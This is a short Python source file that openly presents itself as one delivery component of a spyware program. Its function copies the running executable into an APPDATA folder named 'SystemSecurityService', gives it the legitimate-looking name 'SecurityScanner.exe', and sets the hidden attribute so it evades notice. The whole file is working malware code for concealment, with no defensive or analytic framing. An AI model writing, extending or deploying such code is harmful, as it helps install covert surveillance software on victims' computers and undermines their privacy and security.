"""
Delivery Function 3: Hide Spyware
Copies spyware executable to hidden location with legitimate name
"""

import os
import sys
import shutil

def hide_spyware():
    """
    Copy spyware executable to hidden folder with legitimate-looking name
    Returns: Path to hidden spyware executable or None if failed
    """
    print("[Spyware] Function 3: Hiding spyware executable...")
    
    try:
        # Get current executable path
        current_exe = sys.argv[0]
        
        # Get spyware folder path
        appdata = os.getenv('APPDATA')
        spyware_folder = os.path.join(appdata, "SystemSecurityService")
        
        # Use legitimate-sounding name
        hidden_exe = os.path.join(spyware_folder, "SecurityScanner.exe")
        
        # Copy if not already there
        if not os.path.exists(hidden_exe) or os.path.abspath(current_exe) != os.path.abspath(hidden_exe):
            shutil.copy2(current_exe, hidden_exe)
            
            # Set file as hidden
            os.system(f'attrib +h "{hidden_exe}"')
            
            print(f"[Spyware] Hidden spyware at: {hidden_exe}")
            return hidden_exe
        else:
            print(f"[Spyware] Spyware already hidden at location")
            return hidden_exe
    except Exception as e:
        print(f"[Spyware] Error hiding spyware: {e}")
        return None
